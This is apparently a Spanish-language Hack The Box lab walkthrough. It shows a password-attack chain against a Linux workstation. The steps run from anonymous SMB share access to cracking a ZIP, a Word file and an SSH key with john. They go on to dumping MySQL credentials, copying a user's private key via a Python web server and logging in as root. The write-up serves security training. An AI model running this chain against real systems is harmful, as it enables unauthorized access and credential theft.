--- 
title: "Laboratorio de Ataques de Contraseña - Medio"  
date: 2025-05-28
tags: ["password attacks", "SMB enumeration", "john the ripper", "MySQL", "Linux",]  
categories: ["Hack The Box", "Password Cracking"]
summary: "Este laboratorio de nivel medio se enfoca en técnicas de ataque a contraseñas. A través de SMB, hacemos análisis de archivos protegidos y posteriormente accedemos a una base de datos MySQL, se extrae información sensible, se comprometen usuarios y se accede finalmente al usuario root mediante clave SSH. Ideal para practicar herramientas como `john`, `enum4linux`, `smbclient`, y `ssh2john`."
draft: false 

---
#### Enunciado
Nuestro próximo host es una estación de trabajo que utiliza un empleado para su trabajo diario. Este tipo de hosts se utilizan a menudo para intercambiar archivos con otros empleados y suelen ser administrados por administradores a través de la red. Durante una reunión con el cliente, nos informaron que muchos usuarios internos utilizan este host como host de acceso directo. El objetivo es proteger los archivos que contienen información confidencial.
#### **Enumeración de puertos**
Vamos con lo básico a ver qué servicios están corriendo sobre el servidor.
```bash
nmap -p- -sS --min-rate 2000 -n -Pn <IP>
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/nmap1.png)
Vemos que tenemos los puertos 22, 139 y 445 abiertos, vamos a recoger más información de los servicios que hay corriendo en cada puerto que nos salió a ver si vemos algo interesante.
```bash
nmap -p22,139,445 -sCV -n -Pn <IP>
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/nmap2.png)

Vemos las versiones de los servicios, así como que está corriendo un Linux en el servidor. 
Procedemos a recopilar más información sobre **smb** 
```bash
enum4linux-ng <IP>
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/enum4linux.png)
Representándonos principalmente la siguiente información:
- Nombre del equipo: `SKILLS-MEDIUM`
- Sistema operativo: Linux
-  Está permitida la sesión SMB sin credenciales.
- Usuario válido: `sam`
- **Comparticiones**:
    - `SHAREDRIVE`
    - `print$`
    - `IPC$`

Entonces dado que permite la conexión sin credenciales vamos a intentar listar información del servidor.

```bash
smbclient //<IP>/SHAREDRIVE -N
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/smbclient1.png)
Vemos que tenemos un archivo `.zip`, lo descargamos 
```bash
get Docs.zip
```
Al intentar abrirlo nos damos cuenta que tiene contraseña con lo que procedemos a extraer el hash para luego intentar crackearlo.

```bash
zip2john Docs.zip > zip.hash
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/zip2john1.png)

Utilizando los diccionarios que nos brinda el mismo módulo de ataques a contraseñas crackeamos el hash.

```bash
john --wordlist=/.../mut_password.list zip.hash
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/john1.png)

Dando la contraseña del archivo **Destiny2022!**. A continuación lo descomprimimos usando este password.

```bash
unzip Docs.zip
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/john3.png)
Sin embargo vemos que el archivo está encriptado.  
Con lo cual usamos `office2john` para extraer su hash e intentar crackearlo posteriormente.

```bash
office2john Documentation.docx > docx.hash
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/john4.png)

Igual crackeamos el hash con las wordlist que nos dieron en el modulo:

```bash
john --wordlist=/.../mut_password.list docx.hash
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/john2.png)
Donde vemos que pudimos encontrar el hash correspondiente. 
Ahora procedemos a abrir el archivo `.docx`.

Vemos que tenemos lo siguiente:
![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root1.png)
`jason:C4mNKjAtL2dydsYa6`
Con las credenciales nos autenticamos por ssh para entrar al servidor.
```bash
ssh jason@<IP>
#Password
```
![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/john5.png)
Luego de revisar un poco la información del servidor con el siguiente comando podemos ver qué puertos están abiertos y qué servicios están escuchando.

```bash
ss -tuln
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root2.png)
Nos fijamos que tenemos escuchando los servicios 22(ssh), 53(dns), 139|445 (smb),  3306|33060(mysql).

Intenamos entrar al servidor mysql con las credenciales de jason.

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root3.png)

Y nos lo permite, a continuación vemos las bases de datos disponibles.

```mysql
show databases;
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root4.png)
```mysql
use users;
```
Usamos la base de datos `users` y vemos las tablas de dicha base de datos 
```mysql
show tables;
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root5.png)
Hacemos una consulta a ver que información tiene y vemos una lista de usuarios y contraseñas.
```mysql
select * from creds;
```
![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root6.png)

y vemos que al final de la tabla hay tenemos las credenciales de dennis el otro usuario del servidor.

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root7.png)

Nos autenticamos como dennis

```bash
su dennis
#Password
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root8.png)

En el directorio de dennis vemos que tenemos un archivo `.bash_history` y al abrirlo vemos que se crearon un par de claves ssh y luego vemos que hacen un `sudo -l`. 

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root9.png)

Vamos a traernos a local el id_rsa del directorio personal de dennis para analizarlo mejor.
Nos movemos en el servidor al directorio `/home/dennis/.ssh/`

```bash
cd .ssh/
#Nos montamos un servidor python para enviar el archivo id_rsa a nuestra máquina local.
python3 -m http.server
```

```bash
#En la máquina local hacemos un wget para bajarnos el archivo id_rsa
wget http://<IP>:8000/id_rsa
```
![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root10.png)

Luego le pasamos el ssh2john para extraer su hash y ver si lo podemos crackear. 

```bash 
ssh2john id_rsa > ssh.hash
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root11.png)

Lo crackeamos con la wordlist de passwords que nos dieron en el modulo luego de haberle aplicado los respectivos custom.rules. 

```bash
john --wordlist=/.../mut_password.list ssh.hash
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root12.png)
Viendo que podemos crackear el hash.

A continuación usamos el `id_rsa` para autenticarnos como root

```bash
ssh root@<IP> -i id_rsa
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root13.png)

Ya lo que queda es ir al directorio donde está la flag y leerla.

![](../../../../../images/HTB_modulos/password_atk_htb_labs_2/root14.png)

**Resumen del laboratorio**:
1. Enumeración de servicios SMB
2. Acceso a archivo zip protegido → cracking → obtención de credenciales
3. Escalada a través de base de datos MySQL
4. Explotación de claves SSH → root

Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.